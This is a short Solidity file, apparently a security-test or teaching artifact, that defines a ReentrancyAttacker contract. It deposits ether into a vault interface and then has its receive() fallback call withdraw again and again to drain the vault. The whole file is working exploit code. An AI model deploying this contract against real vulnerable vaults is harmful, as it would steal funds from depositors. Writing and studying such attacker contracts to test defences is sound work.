// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balances(address) external view returns (uint256);
}

contract ReentrancyAttacker {
    IVault public vault;
    bool public attacking;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
    }

    function withdrawAttack() external {
        attacking = true;
        vault.withdraw(vault.balances(address(this)));
    }

    receive() external payable {
        if (attacking && address(vault).balance > 0) {
            try vault.withdraw(vault.balances(address(this))) {} catch {}
        }
    }
}
